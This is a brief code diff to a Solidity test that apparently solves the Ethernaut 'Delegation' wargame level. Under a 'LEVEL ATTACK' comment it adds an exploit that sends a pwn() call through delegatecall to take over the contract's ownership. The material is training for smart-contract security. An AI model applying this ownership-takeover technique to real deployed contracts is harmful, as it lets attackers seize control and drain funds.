@@ -29,6 +29,9 @@ contract DelegationTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        bytes memory fnSig = abi.encodeWithSignature("pwn()");
+        address(ethernautDelegation).call(fnSig);
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
